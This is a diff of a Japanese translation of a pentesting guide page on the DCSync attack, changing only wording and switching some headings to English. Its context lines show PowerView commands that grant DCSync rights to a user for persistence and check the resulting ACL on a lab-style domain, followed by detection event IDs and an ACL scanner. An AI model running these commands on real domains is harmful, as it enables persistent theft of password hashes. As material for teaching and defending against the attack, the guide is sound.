@@ -41,7 +41,7 @@ Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD
 
 ### 永続性
 
-ドメイン管理者であれば、`powerview`を使用して任意のユーザーにこの権限を付与できます：
+ドメイン管理者であれば、`powerview`の助けを借りて、任意のユーザーにこの権限を付与できます：
 ```powershell
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
@@ -49,14 +49,14 @@ Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -Pr
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
-### 緩和策
+### Mitigation
 
-- セキュリティイベントID 4662 (オブジェクトの監査ポリシーを有効にする必要があります) – オブジェクトに対して操作が行われました
-- セキュリティイベントID 5136 (オブジェクトの監査ポリシーを有効にする必要があります) – ディレクトリサービスオブジェクトが変更されました
-- セキュリティイベントID 4670 (オブジェクトの監査ポリシーを有効にする必要があります) – オブジェクトの権限が変更されました
-- AD ACLスキャナー - ACLの作成と比較レポートを作成します。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
+- Security Event ID 4662 (Audit Policy for object must be enabled) – オブジェクトに対して操作が実行されました
+- Security Event ID 5136 (Audit Policy for object must be enabled) – ディレクトリサービスオブジェクトが変更されました
+- Security Event ID 4670 (Audit Policy for object must be enabled) – オブジェクトの権限が変更されました
+- AD ACL Scanner - ACLの作成と比較レポートを作成します。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
 
-## 参考文献
+## References
 
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
 - [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
